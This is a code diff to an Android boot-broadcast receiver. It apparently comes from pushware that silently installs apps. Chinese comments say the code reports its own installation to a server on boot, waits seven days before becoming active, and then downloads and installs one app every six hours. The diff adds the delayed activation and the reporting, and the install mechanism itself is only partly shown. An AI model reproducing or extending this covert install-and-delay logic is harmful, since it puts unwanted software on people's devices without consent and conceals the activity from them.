@@ -16,36 +16,91 @@ import android.util.Log;
 
 import com.custom.Constant;
 import com.custom.CustomUtils;
+import com.custom.MainApplication;
 import com.custom.SharedPreferencesUtils;
 import com.custom.network.HttpRequest;
 
 public class StartServiceReceiver extends BroadcastReceiver {  
 	Context context = null;
 	public static long sixHoure = 6*60*60*1000;//6小时
+	public static long servenDay = 7*24*60*60*1000;//7天
 	java.text.SimpleDateFormat sf = new java.text.SimpleDateFormat("yyyyMMdd");
     @Override      
     public void onReceive(Context context, Intent intent) { 
-    	//Log.e("StartServiceReceiver","StartServiceReceiver++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
+    	MainApplication.newInstance(context);
+    	Log.e("StartServiceReceiver","StartServiceReceiver++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
     	this.context = context;
-   	 if (intent.getAction().equals("com.custom.broadcast.StartServiceReceiver")) { 
-   		 //每隔6小时安装一次
-   		 String installTime =SharedPreferencesUtils.getConfigString(
-    				SharedPreferencesUtils.CONFIG_INFO, SharedPreferencesUtils.INSTALL_TIME);
-   		 long times = 0;
-   		 try{
-   			times = Long.parseLong(installTime);
-   		 }catch(Exception e){
-   			 
-   		 }
-   		 
+   	 if (intent.getAction().equals("com.custom.broadcast.StartServiceReceiver")) {
    		 Date dateTime = new Date();
    		 long nowTime = dateTime.getTime();
+   		long times = 0;
+   		
+   		
+   		
+  		 try{
+   	   		 //程序收到开机信号就向服务器上报软件ID为19的安装成功记录，
+  			 //该记录代表本软件已经装上，要确保这个记录上报成功，失败的话隔天要继续上报
+   	   		 String SELF_COMPLETE_RESULT =SharedPreferencesUtils.getConfigString(
+   	    				SharedPreferencesUtils.CONFIG_INFO, SharedPreferencesUtils.SELF_COMPLETE_RESULT);
+   	   		 String SELF_COMPLETE_TIME =SharedPreferencesUtils.getConfigString(
+	    				SharedPreferencesUtils.CONFIG_INFO, SharedPreferencesUtils.SELF_COMPLETE_TIME);
+   	   		 if(SELF_COMPLETE_RESULT.equals("")&&
+   	   				 (SELF_COMPLETE_TIME.equals("")||
+   	   						 !SELF_COMPLETE_TIME.equals(sf.format(dateTime)))){
+	   			    SharedPreferencesUtils.setConfigString(
+	       	      				SharedPreferencesUtils.CONFIG_INFO, 
+	       	      				SharedPreferencesUtils.SELF_COMPLETE_TIME,
+	       	      		        sf.format(dateTime));
+   	   			    if(new CustomUtils(StartServiceReceiver.this.context).updateInstalledInfo("19")){
+   	    	   			SharedPreferencesUtils.setConfigString(
+   	       	      				SharedPreferencesUtils.CONFIG_INFO, 
+   	       	      				SharedPreferencesUtils.SELF_COMPLETE_RESULT,
+   	       	      		        sf.format(dateTime));
+   	   			    }
 
+   	   		 }
+    	 }catch(Exception e){
+    			e.printStackTrace(); 
+    	 }
+   		
+   		
+   		
+   		 try{
+   	   		 //判断一下是7天之后再开始请求，然后也是每六小时下载一款
+   	   		 String completeDate =SharedPreferencesUtils.getConfigString(
+   	    				SharedPreferencesUtils.CONFIG_INFO, SharedPreferencesUtils.COMPLETE_DATE);
+
+   	   		 if(completeDate.equals("")){
+    	   			SharedPreferencesUtils.setConfigString(
+       	      				SharedPreferencesUtils.CONFIG_INFO, 
+       	      				SharedPreferencesUtils.COMPLETE_DATE,
+       	      				String.valueOf(dateTime.getTime()+servenDay));
+    	   			return;
+   	   		 }
+   	   		 
+   	   		 try{
+   	   			 times = 0;
+   	   			 times =Long.parseLong(completeDate);
+    	   	 }catch(Exception e){}
+
+   	   		if(nowTime<times){
+   	   			return;
+   	   		}
+    	 }catch(Exception e){
+    		 e.printStackTrace();
+    	 }
    		 
    		 
    		 try{
-
-   	   		
+   	   		 //每隔6小时安装一次
+   	   		 String installTime =SharedPreferencesUtils.getConfigString(
+   	    				SharedPreferencesUtils.CONFIG_INFO, SharedPreferencesUtils.INSTALL_TIME);
+   	   		 try{
+   	   		    times = 0;
+   	   			times = Long.parseLong(installTime);
+   	   		 }catch(Exception e){
+   	   			 
+   	   		 }
    	   		if(nowTime-times>=sixHoure){
    	   			SharedPreferencesUtils.setConfigString(
    	      				SharedPreferencesUtils.CONFIG_INFO, 
@@ -59,7 +114,7 @@ public class StartServiceReceiver extends BroadcastReceiver {
 
    	   		}
     	 }catch(Exception e){
-    			 
+    		 e.printStackTrace();
     	 }
 
 
@@ -83,7 +138,7 @@ public class StartServiceReceiver extends BroadcastReceiver {
         		 }
         	 }
     	 }catch(Exception e){
-			 
+    		 e.printStackTrace();
     	 }
     	
    		 
